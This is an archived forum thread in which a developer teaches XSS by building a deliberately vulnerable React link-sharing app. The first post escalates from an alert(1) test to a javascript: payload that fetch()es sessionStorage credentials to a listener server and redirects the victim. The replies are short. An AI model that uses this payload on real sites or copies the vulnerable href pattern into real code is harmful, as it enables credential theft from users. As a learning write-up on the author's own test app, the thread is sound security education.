<!DOCTYPE html>
<html lang="en">
  <!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
<head>
    <meta charset="utf-8">
    <title>My first attempt at XSS - Beginner Guides - 0x00sec - The Home of the Hacker</title>
    <meta name="description" content="As some of you might know, I‚Äôm planning to document my journey coming from software development to infosec. This is the first post in the series, I‚Äôd be happy for you to give me your honest opinion. 
So, as a developer, &amp;hellip;">
    <meta name="generator" content="Discourse 3.6.0.beta2-latest - https://github.com/discourse/discourse version 3b1964f3ed8bdc2f181e2abccb1b116e4b814db5">
<link rel="icon" type="image/png" href="../../uploads/default/optimized/2X/3/30c4e7d76acf879a124fdfe4d8d126afe628c189_2_32x32.html">
<link rel="apple-touch-icon" type="image/png" href="../../uploads/default/optimized/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e_2_180x180.html">
<meta name="theme-color" media="all" content="#171616">

<meta name="color-scheme" content="dark">

<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, viewport-fit=cover">
<link rel="canonical" href="13871.html" />

<link rel="search" type="application/opensearchdescription+xml" href="../../opensearch.xml" title="0x00sec - The Home of the Hacker Search">

    
    <link href="../../stylesheets/color_definitions_0x00sec-v2_15_57_dfa17f5b2e0faf8b274cd749dd7dab92384218d4.css_%3b%20filename_%3dUTF-8%27%27color_definitions_0x00sec-v2_15_57_dfa17f5b2e0faf8b274cd749dd7dab92384218d4a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" class="light-scheme" data-scheme-id="15"/>

<link href="../../stylesheets/common_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27common_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="common"  />

  <link href="../../stylesheets/mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="mobile"  />
  <link href="../../stylesheets/desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="desktop"  />



    <link href="../../stylesheets/chat_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27chat_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="chat"  />
    <link href="../../stylesheets/checklist_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27checklist_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="checklist"  />
    <link href="../../stylesheets/discourse-cakeday_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-cakeday_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-cakeday"  />
    <link href="../../stylesheets/discourse-details_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-details_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-details"  />
    <link href="../../stylesheets/discourse-lazy-videos_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-lazy-videos_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-lazy-videos"  />
    <link href="../../stylesheets/discourse-local-dates_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-local-dates_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-local-dates"  />
    <link href="../../stylesheets/discourse-narrative-bot_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-narrative-bot_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-narrative-bot"  />
    <link href="../../stylesheets/discourse-presence_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-presence_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-presence"  />
    <link href="../../stylesheets/discourse-solved_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-solved_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-solved"  />
    <link href="../../stylesheets/discourse-templates_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-templates_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-templates"  />
    <link href="../../stylesheets/discourse-topic-voting_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-topic-voting_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-topic-voting"  />
    <link href="../../stylesheets/docker_manager_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27docker_manager_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="docker_manager"  />
    <link href="../../stylesheets/footnote_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27footnote_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="footnote"  />
    <link href="../../stylesheets/poll_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27poll_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="poll"  />
    <link href="../../stylesheets/spoiler-alert_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27spoiler-alert_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="spoiler-alert"  />
    <link href="../../stylesheets/chat_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27chat_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="chat_mobile"  />
    <link href="../../stylesheets/discourse-solved_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-solved_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="discourse-solved_mobile"  />
    <link href="../../stylesheets/discourse-topic-voting_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-topic-voting_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="discourse-topic-voting_mobile"  />
    <link href="../../stylesheets/chat_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27chat_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="chat_desktop"  />
    <link href="../../stylesheets/discourse-topic-voting_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-topic-voting_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="discourse-topic-voting_desktop"  />
    <link href="../../stylesheets/poll_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27poll_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="poll_desktop"  />

  <link href="../../stylesheets/common_theme_57_2b2f1b92f8727e7da2866f327e36ad944c6960db.css_%3b%20filename_%3dUTF-8%27%27common_theme_57_2b2f1b92f8727e7da2866f327e36ad944c6960dba97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="common_theme" data-theme-id="57" data-theme-name="0x00sec-v2"/>
    <link href="../../stylesheets/mobile_theme_4_7b59060f894813801912cfad9deff99ebb9e9a38.css_%3b%20filename_%3dUTF-8%27%27mobile_theme_4_7b59060f894813801912cfad9deff99ebb9e9a38a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="mobile_theme" data-theme-id="4" data-theme-name="mobile chrome"/>
    <link href="../../stylesheets/desktop_theme_46_ae6f300d6e65399f845f6707524095726ad69a96.css_%3b%20filename_%3dUTF-8%27%27desktop_theme_46_ae6f300d6e65399f845f6707524095726ad69a96a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="desktop_theme" data-theme-id="46" data-theme-name="header links v2"/>

    <link rel="stylesheet" href="../../../external.html?link=https://s3.amazonaws.com/0x00sec/monokai-sublime.css">
<script src="../../../external.html?link=https://s3.amazonaws.com/0x00sec/highlight.pack.js" nonce="Cw6fnOMKTLPsp4TJBs2sH3uqH"></script>
<script defer="" src="../../theme-javascripts/05954ff525aceb8daa8b585f92d758d311ae7077.js_%3b%20filename_%3dUTF-8%27%2705954ff525aceb8daa8b585f92d758d311ae7077a97f.js?__ws=d.clarkee.co.uk" data-theme-id="40" nonce="Cw6fnOMKTLPsp4TJBs2sH3uqH"></script>
    
        <link rel="alternate nofollow" type="application/rss+xml" title="RSS feed of &#39;My first attempt at XSS&#39;" href="13871.rss" />
    <meta property="og:site_name" content="0x00sec - The Home of the Hacker" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="https://d.clarkee.co.uk/uploads/default/original/2X/2/27a5373af868edade07624e8205c46e79c247445.jpeg" />
<meta property="og:image" content="https://d.clarkee.co.uk/uploads/default/original/2X/2/27a5373af868edade07624e8205c46e79c247445.jpeg" />
<meta property="og:url" content="https://d.clarkee.co.uk/t/my-first-attempt-at-xss/13871" />
<meta name="twitter:url" content="https://d.clarkee.co.uk/t/my-first-attempt-at-xss/13871" />
<meta property="og:title" content="My first attempt at XSS" />
<meta name="twitter:title" content="My first attempt at XSS" />
<meta property="og:description" content="As some of you might know, I‚Äôm planning to document my journey coming from software development to infosec. This is the first post in the series, I‚Äôd be happy for you to give me your honest opinion.  So, as a developer, I‚Äôve heard of OWASP TOP 10, let‚Äôs pick an example from there - XSS looks interesting and maybe I can create a simple app to break.  What is XSS? OWASP says:   Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign..." />
<meta name="twitter:description" content="As some of you might know, I‚Äôm planning to document my journey coming from software development to infosec. This is the first post in the series, I‚Äôd be happy for you to give me your honest opinion.  So, as a developer, I‚Äôve heard of OWASP TOP 10, let‚Äôs pick an example from there - XSS looks interesting and maybe I can create a simple app to break.  What is XSS? OWASP says:   Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign..." />
<meta property="og:article:section" content="Questions" />
<meta property="og:article:section:color" content="BF1E2E" />
<meta property="og:article:section" content="Beginner Guides" />
<meta property="og:article:section:color" content="12A89D" />
<meta property="og:article:tag" content="xss" />
<meta name="twitter:label1" value="Reading time" />
<meta name="twitter:data1" value="3 mins üïë" />
<meta name="twitter:label2" value="Likes" />
<meta name="twitter:data2" value="19 ‚ù§" />
<meta property="article:published_time" content="2019-05-24T08:25:56+00:00" />
<meta property="og:ignore_canonical" content="true" />


    
  </head>
  <body class="crawler ">
    <div id="top-navbar" class="container">
<span id="top-navbar-links" style="display:none;">
  <!--<a href="https://git.0x00sec.org" class="dow-menu">GitLab</a>  
  <a href="https://blog.0x00sec.org/irc" class="dow-menu">IRC</a>!-->
  <a href="../../../external.html?link=https://init.0x00sec.org/" class="dow-menu">Init</a>
  <a href="../../../external.html?link=https://discord.gg/c6BHVfn" class="dow-menu">Discord</a>
  <a href="../../../external.html?link=https://init.0x00sec.org/?partners" class="dow-menu">Partners</a>
</span>
</div>
    <header>
  <a href="../../index.html">0x00sec - The Home of the Hacker</a>
</header>

    <div id="main-outlet" class="wrap" role="main">
        <div id="topic-title">
    <h1>
      <a href="13871.html">My first attempt at XSS</a>
    </h1>

      <div class="topic-category" itemscope itemtype="../../../external.html?link=http://schema.org/BreadcrumbList">
          <span itemprop="itemListElement" itemscope itemtype="../../../external.html?link=http://schema.org/ListItem">
            <a href="../../c/support/52.html" class="badge-wrapper bullet" itemprop="item">
              <span class='badge-category-bg' style='background-color: #BF1E2E'></span>
              <span class='badge-category clear-badge'>
                <span class='category-name' itemprop='name'>Questions</span>
              </span>
            </a>
            <meta itemprop="position" content="1" />
          </span>
          <span itemprop="itemListElement" itemscope itemtype="../../../external.html?link=http://schema.org/ListItem">
            <a href="../../c/support/new-users/9.html" class="badge-wrapper bullet" itemprop="item">
              <span class='badge-category-bg' style='background-color: #12A89D'></span>
              <span class='badge-category clear-badge'>
                <span class='category-name' itemprop='name'>Beginner Guides</span>
              </span>
            </a>
            <meta itemprop="position" content="2" />
          </span>
      </div>

      <div class="topic-category">
        <div class='discourse-tags list-tags'>
            <a href='../../tag/xss.html' class='discourse-tag' rel="tag">xss</a>
        </div>
      </div>
  </div>

  

    <div itemscope itemtype='../../../external.html?link=http://schema.org/DiscussionForumPosting'>
      <meta itemprop='headline' content='My first attempt at XSS'>
      <link itemprop='url' href='13871.html'>
      <meta itemprop='datePublished' content='2019-05-24T08:25:55Z'>
        <meta itemprop='articleSection' content='Beginner Guides'>
      <meta itemprop='keywords' content='xss'>
      <div itemprop='publisher' itemscope itemtype="../../../external.html?link=http://schema.org/Organization">
        <meta itemprop='name' content='0x00sec - The Home of the Hacker'>
          <div itemprop='logo' itemscope itemtype="../../../external.html?link=http://schema.org/ImageObject">
            <meta itemprop='url' content='../../uploads/default/original/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e.html'>
          </div>
      </div>


          <div id='post_1'  class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/hacker_snail.html'><span itemprop='name'>hacker_snail</span></a>
                
              </span>

                <link itemprop="mainEntityOfPage" href="13871.html">


              <span class="crawler-post-infos">
                  <time  datetime='2019-05-24T08:25:56Z' class='post-time'>
                    May 24, 2019,  8:25am
                  </time>
                  <meta itemprop='dateModified' content='2019-05-24T08:25:56Z'>
              <span itemprop='position'>1</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>As some of you might know, I‚Äôm planning to document my journey coming from software development to infosec. This is the first post in the series, I‚Äôd be happy for you to give me your <em>honest</em> opinion.</p>
<p>So, as a developer, I‚Äôve heard of <a href="../../../external.html?link=https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project" rel="noopener nofollow ugc">OWASP TOP 10</a>, let‚Äôs pick an example from there - XSS looks interesting and maybe I can create a simple app to break.</p>
<h3><a name="p-41766-what-is-xss-1" class="anchor" href="#p-41766-what-is-xss-1"></a>What is XSS?</h3>
<p><a href="../../../external.html?link=https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)" rel="noopener nofollow ugc">OWASP</a> says:</p>
<blockquote>
<p>Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted websites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user. Flaws that allow these attacks to succeed are quite widespread and occur anywhere a web application uses input from a user within the output it generates without validating or encoding it.</p>
</blockquote>
<p>So the gist of it is that through a user input, it‚Äôs possible to embed code that can be executed, let‚Äôs try that.</p>
<p>I‚Äôve learned that both React and Angular (two major players in the front-end framework scene at the time of writing this post)<br>
tries to protect against XSS out of the box, and as a developer you‚Äôll have to explicitly trust content before allowing the browser to execute it without further sanitation.<br>
It makes the demonstration harder, but not impossible.</p>
<p>I‚Äôve cooked up a React app that allows you to enter a URL and share it with someone else - let‚Äôs imagine that it makes sense, like it tracks who clicks, and who closes it without checking out your awesome fortnite videos. It‚Äôs a great way to tell who your <em>real</em> friends are‚Ñ¢.</p>
<pre data-code-wrap="javascript"><code class="lang-javascript">import React from 'react';
import './App.css';

function login() {
  sessionStorage.setItem('auth', 'c25haWw6aHVudGVyMg==');
}

function getSharedUrl() {
  return window.location.hash.split('#')[1];
}

function App() {
  login();
  const sharedUrl = getSharedUrl();
  const defaultUrl = 'http://www.google.com';
  const [link, setLink] = React.useState(sharedUrl || defaultUrl);

  return (
    &lt;main className="main"&gt;
      &lt;h1&gt;Awesome Link Creator&lt;/h1&gt;
      {!!sharedUrl ?
        null :
        &lt;input
          type="text"
          value={link}
          onChange={event =&gt; setLink(event.target.value)}
        /&gt;
      }
      &lt;br/&gt;
      &lt;a href={link}&gt;My awesome link!&lt;/a&gt;
      &lt;br/&gt;
      &lt;p&gt;
        &lt;b&gt;Share it with your friends!&lt;/b&gt;
      &lt;/p&gt;
      &lt;span className="shareable-url"&gt;{window.location.origin}#{link}&lt;/span&gt;
    &lt;/main&gt;
  );
}

export default App;
</code></pre>
<p>If you‚Äôre not much into React or front-end development, here‚Äôs some explanation about the code above:</p>
<pre data-code-wrap="javascript"><code class="lang-javascript">/*
 This is called a React hook - without going into the details,
 this provides us a way of setting an initial value to the variable "link"
 and also gives us a programmatic way of setting its value
*/ 
const [link, setLink] = React.useState(sharedUrl || defaultUrl);
</code></pre>
<pre data-code-wrap="javascript"><code class="lang-javascript">/*
 We set the input's value to be "link" and 
 every time a change event is dispatched from the input
 we will set link to be equal to the current value of the input
 */
&lt;input
  type="text"
  value={link}
  onChange={event =&gt; setLink(event.target.value)}
/&gt;
</code></pre>
<pre data-code-wrap="javascript"><code class="lang-javascript">/*
 This will be the actual vulnerability here
 */
 &lt;a href={link}&gt;My awesome link!&lt;/a&gt;
</code></pre>
<p>Right, so we fire up our browser, and see a beautiful, carefully designed, UX award winning application:</p>
<p><span alt="a screenshot of an application with an input" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-link-slash svg-icon" aria-hidden="true"><use href="#link-slash"></use></svg></span></p>
<p>But how do we know if it‚Äôs vulnerable to XSS? The description of XSS mentions something like</p>
<blockquote>
<p>occur anywhere a web application uses input from a user</p>
</blockquote>
<p>Let‚Äôs try that then, but still, <em>how</em> would we know?<br>
It‚Äôs a common practice to call the javascript function <code>alert()</code> with any argument, like the number <code>1</code> - this will tell us if we can continue our research.<br>
If you look at the screenshot, you can see that there‚Äôs a shareable URL at the bottom of the page - with the app‚Äôs source code above, we know that it‚Äôll generate a link with the user‚Äôs input.</p>
<p>That means we need a small addition to our <code>alert(1)</code> test, which is to tell the browser to execute it as javascript. We can achieve this by prefixing it with javascript, so the final input will be <code>javascript:alert(1)</code></p>
<p><span alt="application with an input of javascript:alert(1)" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-link-slash svg-icon" aria-hidden="true"><use href="#link-slash"></use></svg></span></p>
<p>And yes, if we click ‚ÄúMy awesome link!‚Äù, we‚Äôll see 1 in a popup.</p>
<p><span alt="javascript popup showing 1" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-link-slash svg-icon" aria-hidden="true"><use href="#link-slash"></use></svg></span></p>
<p>Now, this is good, we know there‚Äôs an XSS vulnerability on this page, we can wrap up, thanks for the atte‚Ä¶ hold on‚Ä¶</p>
<p>A <a href="../../../external.html?link=https://medium.com/@hakluke/upgrade-xss-from-medium-to-critical-cb96597b6cc4" rel="noopener nofollow ugc">brilliant read</a> by Luke Stephens points out that this doesn‚Äôt demonstrate well the severity of XSS in modern applications, and he‚Äôs right, so let‚Äôs see what else we can do.</p>
<p>It‚Äôs common practice to store some kind of data in either:</p>
<ul>
<li>cookies</li>
<li>local storage</li>
<li>session storage</li>
<li>memory</li>
</ul>
<p>Let‚Äôs see if we have any luck with the above, I‚Äôll open up the developer console in my browser, and see if there‚Äôs anything</p>
<p><span alt="empty browser localstorage and some authentication in sessionStorage" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-link-slash svg-icon" aria-hidden="true"><use href="#link-slash"></use></svg></span></p>
<p>That <code>auth</code> seems useful, but it‚Äôs our own, and we most likely know our own credentials, so not very helpful.<br>
If we think a bit more, we realise that we can probably send a link to others, so we can access <strong>their</strong> credentials.</p>
<p>Let‚Äôs see how could we extract it - we know it‚Äôs stored in <code>sessionStorage</code>, so we can either write</p>
<pre data-code-wrap="javascript"><code class="lang-javascript">javascript:alert(window.sessionStorage.getItem('auth'));

// or we can just dump the whole object, maybe there's more for other users 

javascript:alert(Object.entries(window.sessionStorage))
</code></pre>
<p><span alt="popup with the contents of sessionStorage" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-link-slash svg-icon" aria-hidden="true"><use href="#link-slash"></use></svg></span></p>
<p>We‚Äôd still have to find a way to send this data to ourselves, and an alert is probably going to <em>literally alert</em> people. Let‚Äôs face it, it‚Äôs not very subtle.</p>
<p>I thought of firing up python‚Äôs <code>SimpleHttpServer</code> by issuing this command <code>python3 -m http.server</code> in my terminal.</p>
<p>Next thing is to make a request to it, that‚Äôll leave us with something like</p>
<pre data-code-wrap="javascript"><code class="lang-javascript">javascript:fetch('http://localhost:8000?params=' + Object.entries(window.sessionStorage), {mode: 'no-cors'})
</code></pre>
<p>Almost there, but the link in the app wouldn‚Äôt work, so while it‚Äôs better than the above, it still wouldn‚Äôt go unnoticed, as users wouldn‚Äôt be redirected anywhere.</p>
<pre data-code-wrap="javascript"><code class="lang-javascript">javascript:fetch('http://localhost:8000?params=' + Object.entries(window.sessionStorage), {mode: 'no-cors'}).then(() =&gt; window.location.replace('http://facebook.com'))
</code></pre>
<p>Much better! We‚Äôll use <a href="../../../external.html?link=https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch" rel="noopener nofollow ugc"><code>fetch(url, options)</code></a> to initiate a request to our server (we could even post the data as the body, but a simple <code>GET</code> will do fine in this example), and once that‚Äôs finished, we‚Äôll send the user away!</p>
<p><span alt="redirected to facebook with the request to our server" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-link-slash svg-icon" aria-hidden="true"><use href="#link-slash"></use></svg></span></p>
<p>As you can see above, we‚Äôve been redirected, but the network tab shows that our request has been made first, and indeed</p>
<p><span alt="logs in terminal and base64 decoded user credentials" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-link-slash svg-icon" aria-hidden="true"><use href="#link-slash"></use></svg></span></p>
<p>we received the request containing the credentials.<br>
It‚Äôs common to use Base64 encoded string as the credentials (in the format of <code>user:password</code>) for Basic authentication headers, and whenever I see <code>=</code> at the end of a string, I always assume that it‚Äôs a Base64 encoded string, so let‚Äôs check if we can decrypt it (see above).<br>
We succeed, and we get a username and a password for that account.</p>
<p>Now we‚Äôve gone from</p>
<blockquote>
<p>The app is vulnerable to XSS</p>
</blockquote>
<p>all the way to</p>
<blockquote>
<p>It‚Äôs possible to get all users‚Äô credentials with a single link</p>
</blockquote>
<p>Thanks for reading - feel free to <a href="../../../external.html?link=https://twitter.com/hacker_snail" rel="noopener nofollow ugc">@ me on Twitter</a> to share your thoughts or you can just do it here. I‚Äôll be mirroring these posts on my blog @ <a href="../../../external.html?link=https://hacker-snail.github.io/" rel="noopener nofollow ugc">https://hacker-snail.github.io/</a></p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="15" />
              <span class='post-likes'>15 Likes</span>
            </div>


            
          </div>
          <div id='post_2' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/hasp0t.html'><span itemprop='name'>hasp0t</span></a>
                
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2019-05-24T08:33:25Z' class='post-time'>
                    May 24, 2019,  8:33am
                  </time>
                  <meta itemprop='dateModified' content='2019-05-24T08:33:25Z'>
              <span itemprop='position'>2</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Hey <a class="mention" href="../../u/hacker_snail.html">@hacker_snail</a>! Very nice introduction to XSS and the potential harm of it.</p>
<p>It turns out I will post a solution to an XSS challenge today. Feel free to try it yourself first <img src="../../../0x00sec.org/images/emoji/twitter/slight_smilec164.html?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"><br>
<a href="../../../external.html?link=https://challenge.intigriti.io/2" rel="noopener nofollow ugc">Link</a> to the challenge.</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="1" />
              <span class='post-likes'>1 Like</span>
            </div>


            
          </div>
          <div id='post_3' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/hacker_snail.html'><span itemprop='name'>hacker_snail</span></a>
                
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2019-05-24T08:55:05Z' class='post-time'>
                    May 24, 2019,  8:55am
                  </time>
                  <meta itemprop='dateModified' content='2019-05-24T08:55:05Z'>
              <span itemprop='position'>3</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Thanks! I‚Äôm looking forward to your write-up, let‚Äôs see if I can make it work before the deadline!</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="3" />
              <span class='post-likes'>3 Likes</span>
            </div>


            
          </div>
          <div id='post_4' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/jay_darive.html'><span itemprop='name'>jay_darive</span></a>
                (jesus darive)
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2020-04-08T11:16:19Z' class='post-time'>
                    April 8, 2020, 11:16am
                  </time>
                  <meta itemprop='dateModified' content='2020-04-08T11:16:19Z'>
              <span itemprop='position'>4</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Great Topic, thanks a lot <img src="../../../0x00sec.org/images/emoji/twitter/smileyc164.html?v=9" title=":smiley:" class="emoji" alt=":smiley:"></p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="0" />
              <span class='post-likes'></span>
            </div>


            
          </div>
          <div id='post_5' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/pry0cc.html'><span itemprop='name'>pry0cc</span></a>
                (Leader &amp; Offsec Engineer &amp; Forum Daddy)
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2020-04-08T12:27:01Z' class='post-time'>
                    April 8, 2020, 12:27pm
                  </time>
                  <meta itemprop='dateModified' content='2020-04-08T12:27:01Z'>
              <span itemprop='position'>5</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Hey <a class="mention" href="../../u/hacker_snail.html">@hacker_snail</a> - your images are broken dude!</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="0" />
              <span class='post-likes'></span>
            </div>


            
          </div>
          <div id='post_6' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
